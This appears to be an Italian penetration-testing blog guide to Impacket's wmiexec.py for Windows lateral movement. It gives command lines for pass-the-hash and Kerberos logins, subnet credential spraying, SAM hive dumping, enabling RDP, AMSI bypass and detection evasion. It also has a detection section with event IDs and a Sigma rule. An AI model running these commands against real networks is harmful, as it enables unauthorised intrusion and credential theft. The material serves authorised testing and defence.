---
title: 'WMIExec: guida completa al lateral movement stealth con wmiexec.py'
slug: wmiexec
description: 'Scopri come usare WMIExec e wmiexec.py di Impacket per lateral movement su Windows con password, Pass-the-Hash e Kerberos, riducendo gli artefatti rispetto a PsExec e migliorando l’OPSEC.'
image: /wmiexec.webp
draft: true
date: 2026-04-02T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - impacket
  - wmi-lateral-movement
---

WMIExec rappresenta oggi uno dei tool più efficaci per il lateral movement durante penetration test e red team engagement. A differenza di PsExec, **non scrive file binari su disco** e non crea servizi Windows, rendendolo significativamente più stealth. Questa guida copre l'architettura tecnica, i comandi pratici, le tecniche di detection e il troubleshooting completo per padroneggiare questo strumento essenziale.

Il valore di WMIExec risiede nella sua capacità di sfruttare Windows Management Instrumentation—un componente legittimo presente su ogni sistema Windows—per eseguire comandi remoti attraverso il protocollo DCOM. Questo approccio genera un profilo di detection molto diverso rispetto ai tradizionali tool di amministrazione remota, posizionandolo come scelta preferita quando l'OPSEC è prioritaria.

## Come funziona WMIExec: architettura DCOM e Win32\_Process

WMI (Windows Management Instrumentation) è l'implementazione Microsoft degli standard WBEM e CIM, fornendo un'interfaccia unificata per gestire sistemi Windows. WMIExec sfrutta specificamente la classe **Win32\_Process** per creare processi remoti attraverso DCOM (Distributed Component Object Model).

Il flusso di connessione prevede cinque fasi distinte. Prima, il client si connette alla porta **TCP 135** (DCE/RPC endpoint mapper). Successivamente, viene effettuato un bind request all'interfaccia ISystemActivator. DCOM quindi istanzia l'interfaccia IWbemLevel1Login per l'autenticazione. Il login avviene al namespace **root\cimv2**, location predefinita per le operazioni WMI di sistema. Infine, viene caricata la classe Win32\_Process per l'esecuzione dei comandi.

| Componente              | Funzione                     | Porta       |
| ----------------------- | ---------------------------- | ----------- |
| DCE/RPC Endpoint Mapper | Connessione iniziale         | TCP 135     |
| DCOM Dynamic Ports      | Comunicazioni RPC successive | 49152-65535 |
| SMB (opzionale)         | Recupero output comandi      | TCP 445     |
| Win32\_Process::Create  | Creazione processo remoto    | N/A (WMI)   |

La caratteristica distintiva di wmiexec.py (Impacket) è il metodo di recupero output: i comandi vengono wrappati nel formato `cmd.exe /Q /c <comando> 1> \\127.0.0.1\ADMIN$\__<EPOCHTIME> 2>&1`, dove l'output viene scritto in un file temporaneo sulla share ADMIN$ e poi recuperato via SMB. Il file viene immediatamente eliminato dopo la lettura, minimizzando gli artefatti.

## Versioni attuali dei tool e installazione

Prima di procedere con gli scenari pratici, è fondamentale verificare di utilizzare le versioni aggiornate. Le release correnti (febbraio 2026) sono:

| Tool                | Versione                   | Data Release | Repository                        |
| ------------------- | -------------------------- | ------------ | --------------------------------- |
| Impacket wmiexec.py | **0.13.0**                 | Ottobre 2025 | github.com/fortra/impacket        |
| NetExec             | **1.4.0** (SmoothOperator) | 2025         | github.com/Pennyw0rth/NetExec     |
| wmiexec-Pro         | **0.4.1**                  | Ottobre 2025 | github.com/XiaoliChan/wmiexec-Pro |

Impacket 0.13.0 introduce miglioramenti significativi: refactoring completo del client SMB, channel binding Kerberos, e supporto Python 3.13. wmiexec-Pro merita attenzione particolare perché opera **esclusivamente sulla porta 135**, eliminando la dipendenza da SMB—caratteristica cruciale quando la porta 445 è bloccata o monitorata intensivamente.

Per approfondire altri tool Impacket essenziali per il penetration testing, consulta la nostra guida su [secretsdump e DCSync](hackita.it/articoli/dcsync).

## Scenari completi di lateral movement

### Scenario 1: credenziali Domain Admin verso workstation

Dopo aver compromesso credenziali di un Domain Admin, il movimento laterale verso workstation target è immediato:

```bash
# Connessione con password
wmiexec.py contoso.local/administrator:'SecureP@ss123'@WKS01.contoso.local

# Output atteso
Impacket v0.13.0 - Copyright Fortra, LLC
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>whoami
contoso\administrator
C:\>hostname
WKS01
```

La shell semi-interattiva permette l'esecuzione di comandi sequenziali. I comandi built-in `lput` e `lget` consentono upload e download file senza tool aggiuntivi.

### Scenario 2: Pass-the-Hash da workstation compromessa

Dopo aver estratto hash NTLM con [Mimikatz](hackita.it/articoli/mimikatz), il movimento laterale prosegue senza necessità della password in chiaro:

```bash
# Verifica hash su più target
nxc smb 192.168.1.50-60 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 --local-auth

# Lateral movement con hash
wmiexec.py -hashes :32196B56FFE6F45E294117B91A83BF38 ./Administrator@192.168.1.55

# Comando singolo senza shell interattiva
wmiexec.py -hashes :32196B56FFE6F45E294117B91A83BF38 ./Administrator@192.168.1.55 "net user /domain"
```

### Scenario 3: autenticazione Kerberos con ticket

Per ambienti con monitoring NTLM avanzato, l'autenticazione Kerberos riduce ulteriormente il profilo di detection:

```bash
# Export ticket da ccache
export KRB5CCNAME=/tmp/krb5cc_administrator

# Connessione con Kerberos
wmiexec.py -k -no-pass contoso.local/administrator@DC01.contoso.local -dc-ip 10.10.10.10

# Alternativa con AES key
wmiexec.py -aesKey <256_bit_hex_key> contoso.local/administrator@DC01 -k -no-pass
```

## Attack chain completa: dal recon alla persistence

Una attack chain realistica con WMIExec segue un flusso strutturato. La fase di **reconnaissance** richiede credenziali valide (username/password, hash NTLM, o ticket Kerberos), privilegi amministrativi sul target, e connettività di rete sulle porte necessarie.

```bash
# Port scan per servizi WMI/SMB
nmap -p 135,445,593,49152-65535 192.168.1.0/24

# Enumerazione share per verificare accesso ADMIN$
nxc smb 192.168.1.0/24 -u administrator -p 'Password123' --shares
```

Durante il **lateral movement**, WMIExec permette pivot verso sistemi critici. Per la **privilege escalation**, è possibile abilitare servizi o creare task schedulati:

```bash
# Abilitare RDP per accesso persistente
wmiexec.py domain/admin:pass@TARGET "reg add \"HKLM\System\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"

# Dump credenziali per ulteriore movimento
wmiexec.py domain/admin:pass@TARGET "reg save HKLM\SAM C:\temp\sam.save"
```

La **persistence** via WMI sfrutta le Event Subscription—una triade composta da Event Filter, Event Consumer, e binding. Questa tecnica, mappata come **MITRE ATT\&CK T1546.003**, sopravvive ai reboot e viene eseguita come SYSTEM. Per strategie di persistence alternative, consulta la guida su [persistence techniques in Active Directory](hackita.it/articoli/persistence-active-directory).

## Detection: Event ID, Sysmon e indicatori forensi

Dal punto di vista blue team, WMIExec lascia artefatti specifici identificabili attraverso log analysis e monitoring comportamentale.

### Event ID critici per il rilevamento

**Event ID 4688** (Process Creation) rivela la catena di processi anomala: `wmiprvse.exe` che spawna `cmd.exe` con i flag `/Q /c` e redirezione verso `\\127.0.0.1\ADMIN$\__<timestamp>`. Questa signature è altamente indicativa.

**Event ID 4624 Type 3** (Network Logon) registra l'autenticazione remota. Correlare questo evento con 4688 usando il Logon ID permette di ricostruire la sessione completa.

**Sysmon Event 1** con ParentImage che termina in `\wmiprvse.exe` e CommandLine contenente il pattern caratteristico fornisce detection ad alta fedeltà. Gli **eventi Sysmon 19/20/21** rilevano invece la creazione di WMI Event Subscription per persistence.

```yaml
# Sigma rule per WMIExec detection
title: Impacket WMIExec Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\wmiprvse.exe'
    CommandLine|contains|all:
      - 'cmd.exe /Q /c'
      - '\\127.0.0.1\ADMIN$'
      - '2>&1'
  condition: selection
level: high
```

### Artefatti forensi sul sistema target

| Artefatto      | Location                                 | Descrizione                           |
| -------------- | ---------------------------------------- | ------------------------------------- |
| Output files   | `C:\Windows\__<EPOCHTIME>`               | File temporanei (se cleanup fallisce) |
| Prefetch       | `WMIPRVSE.EXE-*.pf`                      | Riferimenti a file temporanei         |
| WMI Repository | `%SystemRoot%\System32\wbem\Repository\` | OBJECTS.DATA per persistence          |
| Registry       | `HKLM\SOFTWARE\Microsoft\WBEM\ESS`       | Event subscription settings           |

Per implementare detection efficace nel tuo SIEM, approfondisci le [tecniche di threat hunting per lateral movement](hackita.it/articoli/threat-hunting-lateral-movement).

## Evasion techniques: come gli attaccanti evadono il rilevamento

Gli operatori red team avanzati utilizzano tecniche specifiche per ridurre la detectability. La **WMI class derivation** prevede la creazione di classi custom derivate da Win32\_Process—le detection rules che cercano specificamente "Win32\_Process" vengono bypassate.

Il **timing-based evasion** sfrutta event subscription con trigger delayed, evitando correlazione temporale tra autenticazione ed esecuzione. L'opzione `-silentcommand` di wmiexec.py non crea file di output, eliminando l'artefatto più distintivo ma sacrificando la visibilità sui risultati.

**wmiexec-Pro** rappresenta l'evoluzione moderna: operando esclusivamente sulla porta 135 senza SMB, evade detection basata su accesso alle share. Include inoltre moduli per AMSI bypass, eventlog cleaning, e manipolazione firewall.

## Confronto con alternative: quando usare cosa

La scelta del tool dipende dal contesto operativo e dai requisiti OPSEC:

| Criterio           | WMIExec          | PsExec      | WinRM      | AtExec          |
| ------------------ | ---------------- | ----------- | ---------- | --------------- |
| Binario su disco   | No               | Sì          | No         | No              |
| Creazione servizio | No               | Sì          | No         | Task            |
| Porte richieste    | 135+dyn          | 445         | 5985/5986  | 135+445         |
| Detection level    | Basso            | Alto        | Medio      | Medio           |
| Shell type         | Semi-interattiva | Interattiva | PowerShell | Singolo comando |
| Pass-the-Hash      | Sì               | Sì          | Sì         | Sì              |

**Usa WMIExec quando**: l'OPSEC è prioritaria, devi evitare scrittura su disco, e la porta 135 è raggiungibile. **Usa PsExec quando**: necessiti shell fully-interactive e il detection non è un concern primario. **Usa WinRM quando**: hai bisogno di PowerShell remoting nativo e le porte 5985/5986 sono disponibili.

## Troubleshooting: risoluzione errori comuni

### Error 0x80070005 (ACCESS\_DENIED)

Questo errore indica problemi di permessi DCOM o WMI. Verificare che l'utente sia nel gruppo Administrators locale. Su sistemi non-domain, abilitare `LocalAccountTokenFilterPolicy`:

```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

### Error 0x800706BA (RPC\_SERVER\_UNAVAILABLE)

Indica connettività bloccata. Verificare firewall sulla porta 135 e range dinamico RPC. Testare con:

```bash
Test-NetConnection -ComputerName TARGET -Port 135
```

Abilitare regole firewall WMI sul target:

```powershell
netsh advfirewall firewall set rule group="Windows Management Instrumentation (WMI)" new enable=yes
```

### Timeout e problemi Kerberos

Per timeout, aumentare il valore con NetExec: `nxc wmi TARGET -u user -p pass --exec-timeout 30`. Per Kerberos, verificare sincronizzazione temporale (massimo 5 minuti di skew), corretta risoluzione DNS del target, e export corretto del ticket in KRB5CCNAME.

## Cheat sheet: comandi essenziali WMIExec

```bash
# === AUTENTICAZIONE ===
wmiexec.py domain/user:password@TARGET                    # Password
wmiexec.py -hashes :NTHASH domain/user@TARGET            # Pass-the-Hash
wmiexec.py -k -no-pass domain/user@TARGET -dc-ip DC_IP   # Kerberos

# === ESECUZIONE ===
wmiexec.py domain/user:pass@TARGET                        # Shell interattiva
wmiexec.py domain/user:pass@TARGET "whoami /all"          # Comando singolo
wmiexec.py -shell-type powershell domain/user:pass@TARGET # PowerShell shell
wmiexec.py -silentcommand domain/user:pass@TARGET "cmd"   # No output file

# === NETEXEC ===
nxc wmi 192.168.1.0/24 -u user -p pass                    # Spray subnet
nxc wmi TARGET -u user -p pass -x "whoami"                # Exec comando
nxc wmi TARGET -u user -H HASH --exec-method wmiexec-event # Event-based

# === WMIEXEC-PRO (Solo porta 135) ===
wmiexec-pro.py admin:pass@TARGET exec-command -shell      # Shell
wmiexec-pro.py admin:pass@TARGET filetransfer -upload -src-file ./file -dest-file C:\file
wmiexec-pro.py admin:pass@TARGET rdp -enable              # Abilita RDP
wmiexec-pro.py admin:pass@TARGET amsi -enable             # AMSI bypass
```

## FAQ: domande frequenti su WMIExec

**Cos'è WMIExec e a cosa serve?**
WMIExec è un tool del framework Impacket che permette l'esecuzione di comandi remoti su sistemi Windows sfruttando WMI (Windows Management Instrumentation). Viene utilizzato principalmente per lateral movement durante penetration test, consentendo movimento tra sistemi con credenziali valide senza scrivere file eseguibili su disco.

**Quali porte utilizza WMIExec?**
WMIExec utilizza la porta TCP 135 per l'endpoint mapper RPC, porte dinamiche nel range 49152-65535 per le comunicazioni DCOM, e opzionalmente la porta TCP 445 per recuperare l'output dei comandi tramite share SMB (ADMIN$).

**Qual è la differenza tra WMIExec e PsExec?**
WMIExec non scrive file binari su disco e non crea servizi Windows, risultando più stealth. PsExec invece carica un eseguibile temporaneo e crea un servizio, generando eventi 7045 facilmente rilevabili. WMIExec usa DCOM/WMI mentre PsExec usa esclusivamente SMB.

**Come rilevare attività WMIExec?**
Monitorare Event ID 4688 per process creation con parent `wmiprvse.exe` che spawna `cmd.exe`. Cercare command line contenenti il pattern `\\127.0.0.1\ADMIN$\__` seguito da timestamp. Sysmon eventi 19-21 rilevano WMI persistence.

**WMIExec funziona con hash NTLM?**
Sì, WMIExec supporta nativamente Pass-the-Hash. Usare l'opzione `-hashes :NTHASH` dove NTHASH è l'hash NT (32 caratteri hex). Non è necessaria la parte LM, che può essere omessa o sostituita con hash vuoto.

**Perché ricevo errore "Access Denied" con WMIExec?**
L'errore 0x80070005 indica tipicamente: utente non nel gruppo Administrators locale, LocalAccountTokenFilterPolicy non configurata per account non-RID 500, o permessi DCOM/WMI insufficienti sul target. Verificare credenziali e configurazione UAC remoto.

**Esiste una versione di WMIExec che non richiede SMB?**
Sì, wmiexec-Pro opera esclusivamente sulla porta 135 senza necessità di SMB. Questo tool offre funzionalità avanzate come file transfer via classi WMI, AMSI bypass, e manipolazione firewall, risultando utile quando la porta 445 è bloccata.

***

*Articolo aggiornato: Febbraio 2026 | Versioni: Impacket 0.13.0, NetExec 1.4.0, wmiexec-Pro 0.4.1*

**Link interni correlati:**

* [DCSync e Secretsdump: estrazione credenziali AD](hackita.it/articoli/dcsync)
* [Mimikatz: credential extraction avanzata](hackita.it/articoli/mimikatz)
* [Persistence in Active Directory](hackita.it/articoli/persistence-active-directory)
* [Threat Hunting per Lateral Movement](hackita.it/articoli/threat-hunting-lateral-movement)
* [PowerView: enumerazione Active Directory](hackita.it/articoli/powerview)
